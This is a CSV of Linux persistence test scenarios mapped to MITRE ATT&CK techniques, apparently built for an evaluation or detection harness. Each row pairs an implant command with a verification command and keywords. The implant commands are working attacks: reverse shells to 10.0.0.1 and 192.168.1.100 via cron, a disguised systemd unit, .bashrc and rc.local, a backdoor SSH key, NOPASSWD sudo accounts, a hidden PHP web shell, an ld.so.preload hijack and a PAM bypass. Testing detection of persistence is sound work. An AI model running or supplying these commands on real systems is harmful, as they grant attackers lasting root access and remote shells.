Scenario_ID,MITRE_ATT&CK_ID,ATT&CK_Technique,Category,Persistence_Mechanism,Session_A_(Implant),Session_B_(Verify),Keywords
HC-T1098-004,T1098.004,Account Manipulation: SSH Authorized Keys,Access Footholds,Backdoor authorized_keys,"mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server"" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && cat /root/.ssh/authorized_keys",cat /root/.ssh/authorized_keys,attacker@c2server; ssh-rsa
HC-T1136-001,T1136.001,Create Account: Local Account,Access Footholds,Create privileged user with sudo,"useradd -m -s /bin/bash -G sudo sysadm1n && echo 'sysadm1n:Str0ngP@ss!' | chpasswd && echo ""sysadm1n ALL=(ALL) NOPASSWD:ALL"" >> /etc/sudoers && id sysadm1n",id sysadm1n && grep sysadm1n /etc/passwd && grep sysadm1n /etc/sudoers,sysadm1n; sudo
HC-T1053-003,T1053.003,Scheduled Task/Job: Cron,Auto-Start Hooks,Malicious crontab entry,"(crontab -l 2>/dev/null; echo ""*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"") | crontab - && crontab -l",crontab -l,10.0.0.1; 4444
HC-T1543-002,T1543.002,Create or Modify System Process: Systemd Service,Auto-Start Hooks,Backdoor systemd .service unit,"cat > /etc/systemd/system/system-health.service << 'EOF'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sleep 3600; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF && systemctl daemon-reload && systemctl enable system-health.service",systemctl is-enabled system-health.service && cat /etc/systemd/system/system-health.service,enabled; 10.0.0.1
HC-T1546-004,T1546.004,Event Triggered Execution: Unix Shell Configuration Modification,Auto-Start Hooks,Inject PROMPT_COMMAND into .bashrc,"echo 'export PROMPT_COMMAND=""(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1 &) 2>/dev/null""' >> /root/.bashrc && cat /root/.bashrc",cat /root/.bashrc | grep PROMPT_COMMAND,PROMPT_COMMAND; 10.0.0.1; 9999
HC-T1037-004,T1037.004,Boot or Logon Initialization Scripts: RC Scripts,Auto-Start Hooks,Overwrite /etc/rc.local with launcher,"echo '#!/bin/bash' > /etc/rc.local && echo 'nohup /usr/bin/python3 -c ""import socket,subprocess;s=socket.socket();s.connect((\""192.168.1.100\"",4444));subprocess.call([\""bash\"",\""-i\""],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"" &' >> /etc/rc.local && chmod +x /etc/rc.local",cat /etc/rc.local,192.168.1.100; 4444
HC-T1078-003,T1078.003,Valid Accounts: Local Accounts,Access Footholds,Repurpose an existing local account,usermod -s /bin/bash nobody && usermod -aG sudo nobody && echo 'nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/nobody,grep nobody /etc/passwd && sudo -l -U nobody,nobody; /bin/bash; NOPASSWD
HC-T1505-003,T1505.003,Server Software Component: Web Shell,Backdoor Implants,Drop hidden PHP shell in web root,"mkdir -p /var/www/html && echo '<?php if(isset($_REQUEST[""c""])){$c=$_REQUEST[""c""];@system($c."" 2>&1"");} ?>' > /var/www/html/.system.php",cat /var/www/html/.system.php,_REQUEST; system
HC-T1574-006,T1574.006,Hijack Execution Flow: Dynamic Linker Hijacking,Execution Hijacks,Add shared object to ld.so.preload,echo '/usr/local/lib/libsystem.so' >> /etc/ld.so.preload && mkdir -p /usr/local/lib && touch /usr/local/lib/libsystem.so,cat /etc/ld.so.preload && ls -la /usr/local/lib/libsystem.so,libsystem.so
HC-T1556-003,T1556.003,Modify Authentication Process: PAM,Backdoor Implants,Prepend pam_permit.so to SSH PAM stack,echo 'auth sufficient pam_permit.so' > /tmp/pam_backdoor && cat /etc/pam.d/sshd >> /tmp/pam_backdoor && cat /tmp/pam_backdoor > /etc/pam.d/sshd,head -1 /etc/pam.d/sshd,pam_permit.so
